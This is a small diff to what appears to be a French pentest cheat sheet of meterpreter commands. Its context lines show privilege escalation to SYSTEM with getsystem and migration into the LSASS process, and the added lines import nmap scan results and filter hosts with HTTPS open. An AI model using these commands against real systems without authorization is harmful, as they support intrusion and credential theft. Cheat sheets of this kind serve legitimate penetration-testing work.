@@ -56,6 +56,12 @@ meterpreter> execute -f <BINAIRE.exe>
 # passer NT\Autority System (il faut un compte admin local)
 meterpreter> getsystem
 meterpreter> migrate <PID_LSASS>
+
+# importer des données de nmap pour lister les machines par services exposés
+meterpreter> import nmap/*.xml
+
+# lister les machines ayant le port HTTPS d'ouvert (filtre)
+meterpreter> services -p 443 -c proto
 ```
 
 
